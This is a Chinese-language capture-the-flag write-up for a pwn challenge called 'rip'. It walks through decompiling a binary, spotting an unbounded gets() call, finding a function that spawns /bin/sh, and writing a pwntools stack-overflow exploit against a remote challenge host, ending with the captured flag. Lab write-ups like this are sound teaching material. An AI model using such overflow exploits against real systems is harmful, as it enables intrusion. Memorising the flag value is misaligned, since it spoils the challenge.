---
title: rip
date: 2023-10-24
categories:
  - CTF
  - Pwn
---

## 前置工作

下载附件，用 IDA 64 进行逆向，找到 `main()` 函数的反汇编伪代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[15]; // [rsp+1h] [rbp-Fh] BYREF

  puts("please input");
  gets(s, argv);
  puts(s);
  puts("ok,bye!!!");
  return 0;
}
```

发现高危函数 `gets()`，没有任何的限制，全部存储进 `s[15]` 中，可造成栈溢出

接下来按下 Shift + F12 寻找 `/bin/sh` 字符串，再按下 Ctrl + X 进入引用的函数，得到以下内容

```
; Attributes: bp-based frame

public fun
fun proc near
; __unwind {
push    rbp
mov     rbp, rsp
lea     rdi, command    ; "/bin/sh"
call    _system
nop
pop     rbp
retn
; } // starts at 401186
fun endp
```

找到函数开始的地址 `0x401186`，命为 `fun_addr`

## 编写 Exp

先用 0xF（数组的大小）+ 8（dup 的大小）个垃圾数据填饱栈，然后将函数 `fun()` 的地址打包发送过去（`pack(x, 64)` 与 `p64()` 作用相同），这种情况在本地是可以运行的，但是远程连接就会失效，就需要给 `fun_addr` +1 来取得堆栈平衡

```python
from pwn import *

r = remote("node4.buuoj.cn", 29901)
fun_addr = 0x401186
payload = b"A"*(0xF + 8) + pack(fun_addr + 1, 64)
r.sendline(payload)
r.interactive()
```

## 攻入靶机

运行攻击代码后，输入 `cat flag`，最终取得的结果为 `flag{dd7de097-3853-4e0e-bc09-d46e2541c68c}`